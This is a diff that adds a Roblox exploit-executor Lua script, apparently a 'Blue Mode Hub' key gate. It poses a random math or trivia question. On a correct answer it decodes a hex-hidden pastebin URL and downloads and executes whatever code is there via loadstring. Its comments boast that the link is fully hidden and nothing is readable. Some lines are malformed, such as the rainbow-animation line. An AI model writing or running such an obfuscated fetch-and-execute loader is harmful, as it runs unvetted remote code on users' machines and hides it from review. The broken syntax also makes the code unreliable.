@@ -1,0 +1,124 @@
+-- ==============================================
+-- 🔵 BLUE MODE HUB — DYNAMIC KEY SYSTEM
+-- QUESTION + ANSWER CHANGE EVERY TIME YOU RUN
+-- NOTHING READABLE IN CODE
+-- ==============================================
+if getgenv().BMH_Dynamic then return end
+getgenv().BMH_Dynamic = true
+
+local _=game;local __=_.GetService;local ___=__(_,"Players");local ____=__(_,"RunService");local _____=__(_,"CoreGui")
+local ______=___.LocalPlayer;local _______=______:FindFirstChild("PlayerGui") or _____
+if _______:FindFirstChild("BMH_DynKey") then _______.BMH_DynKey:Destroy() end
+
+-- 🔐 DECODERS — NOTHING READABLE
+local function _d(s)local r=""for i=1,#s,2 do local b=tonumber(s:sub(i,i+1),16)if b then r=r..string.char(b)end end return r end
+local function _hex(s)return s:gsub(".",function(c)return string.format("%02X",c:byte())end)end
+
+-- 📋 DYNAMIC QUESTION GENERATOR — MAKES NEW PAIRS EVERY RUN
+math.randomseed(os.time())
+
+-- Math types
+local M={
+    {f=function()local a=math.random(2,12)local b=math.random(2,12)return "What is "..a.." × "..b.."?",tostring(a*b)end},
+    {f=function()local a=math.random(10,50)local b=math.random(10,50)return "What is "..a.." + "..b.."?",tostring(a+b)end},
+    {f=function()local a=math.random(20,99)local b=math.random(5,19)if a<b then a,b=b,a end return "What is "..a.." − "..b.."?",tostring(a-b)end},
+    {f=function()local b=math.random(2,10)local a=b*math.random(2,10)return "What is "..a.." ÷ "..b.."?",tostring(a/b)end},
+    {f=function()local a=math.random(2,12)return "What is "..a.."² (squared)?",tostring(a*a)end},
+    {f=function()local a=math.random(1,12)local b=math.random(1,12)local o={{"+","+"},{"−","-"},{"×","*"}}local op,s=o[math.random(#o)]return "What is "..a.." "..op.." "..b.."?",tostring(load("return "..a..s..b)())end}
+}
+
+-- Facts / riddles
+local F={
+    {q="How many days in a week?","7"},
+    {q="How many hours in a day?","24"},
+    {q="How many months in a year?","12"},
+    {q="Opposite of hot?","cold"},
+    {q="Opposite of up?","down"},
+    {q="How many legs does a dog have?","4"},
+    {q="Which planet is red?","mars"},
+    {q="100 − 1 = ?","99"},
+    {q="Half of 100 = ?","50"},
+    {q="How many minutes in 1 hour?","60"},
+    {q="Sun rises in which direction?","east"},
+    {q="How many eyes do you have?","2"},
+    {q="Biggest planet in solar system?","jupiter"},
+    {q="What color is the sky?","blue"},
+    {q="How many weeks in a year?","52"}
+}
+
+-- 🎲 PICK TYPE — MATH OR FACT
+local Q,A
+if math.random()<0.6 then
+    -- Math — ALWAYS NEW!
+    local fn=M[math.random(#M)].f
+    Q,A=fn()
+else
+    -- Fact — random from list
+    local pair=F[math.random(#F)]
+    Q,A=pair.q,pair[2]
+end
+
+-- 🔒 HIDE THE ANSWER INTERNALLY
+local HIDDEN_A=_hex(A:lower())
+
+-- 🔓 YOUR LOADSTRING — HIDDEN IN HEX
+local _X=function()local e="68747470733A2F2F7061737462696E2E636F6D2F7261772F5258565671434476"local s=""for i=1,#e,2 do s=s..string.char(tonumber(e:sub(i,i+1),16))end return s end
+local _L=loadstring or load
+
+-- === INTERFACE ===
+local G=Instance.new("ScreenGui")G.Name="BMH_DynKey"G.ResetOnSpawn=false G.Parent=_______
+local Fm=Instance.new("Frame")Fm.Size=UDim2.new(0,430,0,330)Fm.Position=UDim2.new(0.5,-215,0.5,-165)Fm.BackgroundTransparency=1 Fm.Parent=G
+local Gb=Instance.new("Frame")Gb.Size=UDim2.new(1,16,1,16)Gb.Position=UDim2.new(0,-8,0,-8)
+Gb.BackgroundColor3=Color3.fromRGB(0,130,255)Gb.BackgroundTransparency=0.5 Gb.Parent=Fm
+Instance.new("UICorner",Gb).CornerRadius=UDim.new(0,22)
+
+local M=Instance.new("Frame")M.Size=UDim2.new(1,0,1,0)M.BackgroundColor3=Color3.fromRGB(6,8,24)
+M.BorderSizePixel=2 M.Parent=Fm Instance.new("UICorner",M).CornerRadius=UDim.new(0,18)
+
+local Tb=Instance.new("Frame")Tb.Size=UDim2.new(1,0,0,5)Tb.BackgroundColor3=Color3.fromRGB(0,160,255)Tb.Parent=M
+local Tt=Instance.new("Frame")Tt.Size=UDim2.new(1,0,0,55)Tt.Position=UDim2.new(0,0,0,5)
+Tt.BackgroundColor3=Color3.fromRGB(13,16,38)Tt.Parent=M
+
+local Tl=Instance.new("TextLabel")Tl.Size=UDim2.new(1,-30,1,0)Tl.Position=UDim2.new(0,15,0,0)
+Tl.BackgroundTransparency=1 Tl.Text="🔑 BLUE MODE HUB — DYNAMIC VERIFY"
+Tl.Font=Enum.Font.GothamBold Tl.TextSize=16 Tl.Parent=Tt
+
+local Ql=Instance.new("TextLabel")Ql.Size=UDim2.new(0.92,0,0,115)Ql.Position=UDim2.new(0.04,0,0,75)
+Ql.BackgroundColor3=Color3.fromRGB(17,21,46)Ql.BorderSizePixel=2 Ql.Text=Q
+Ql.Font=Enum.Font.GothamBold Ql.TextSize=15 Ql.TextWrapped=true Ql.Parent=M
+
+local Ib=Instance.new("TextBox")Ib.Size=UDim2.new(0.92,0,0,55)Ib.Position=UDim2.new(0.04,0,0,200)
+Ib.BackgroundColor3=Color3.fromRGB(21,26,53)Ib.BorderSizePixel=2 Ib.PlaceholderText="Your answer..."
+Ib.TextColor3=Color3.new(1,1,1)Ib.Font=Enum.Font.Gotham Ib.TextSize=15 Ib.Parent=M
+
+local Bt=Instance.new("TextButton")Bt.Size=UDim2.new(0.92,0,0,55)Bt.Position=UDim2.new(0.04,0,0,270)
+Bt.BackgroundColor3=Color3.fromRGB(18,105,215)Bt.Font=Enum.Font.GothamBold Bt.Text="✅ UNLOCK HUB"
+Bt.TextSize=16 Bt.Parent=M Instance.new("UICorner",Bt).CornerRadius=UDim.new(0,12)
+
+local St=Instance.new("TextLabel")St.Size=UDim2.new(1,0,0,25)St.Position=UDim2.new(0,0,1,-25)
+St.BackgroundTransparency=1 St.Font=Enum.Font.Gotham St.TextSize=13 St.Parent=M
+
+-- 🌈 RAINBOW ANIMATION
+local H=0____.Heartbeat:Connect(function(d)H=(H+d*0.25)%1 local C=Color3.fromHSV(H,1,1)
+Gb.BackgroundColor3=C M.BorderColor3=C Tb.BackgroundColor3=C
+Ql.BorderColor3=C Ib.BorderColor3=C Bt.BorderColor3=C Tl.TextColor3=C end)
+
+-- ✅ CHECK — COMPARE AGAINST HIDDEN ANSWER
+Bt.MouseButton1Click:Connect(function()
+    local inp=Ib.Text:gsub("^%s*(.-)%s*$","%1"):lower()
+    if _hex(inp)==HIDDEN_A then
+        St.Text="✅ CORRECT — LOADING..."St.TextColor3=Color3.fromRGB(0,255,100)
+        Bt.Active=false task.wait(1)
+        G:Destroy()
+        -- 🔓 EXECUTE MAIN SCRIPT — LINK FULLY HIDDEN
+        local ok,err=pcall(function()
+            return _L(__(_,"HttpService"):GetAsync(_X(),true))()
+        end)
+        if not ok then warn("Load failed: "..tostring(err)) end
+    else
+        St.Text="❌ WRONG — TRY AGAIN"St.TextColor3=Color3.fromRGB(255,50,50)
+        task.wait(2)St.Text=""
+    end
+end)
+
+print("✅ BLUE MODE HUB — DYNAMIC KEY ACTIVE")
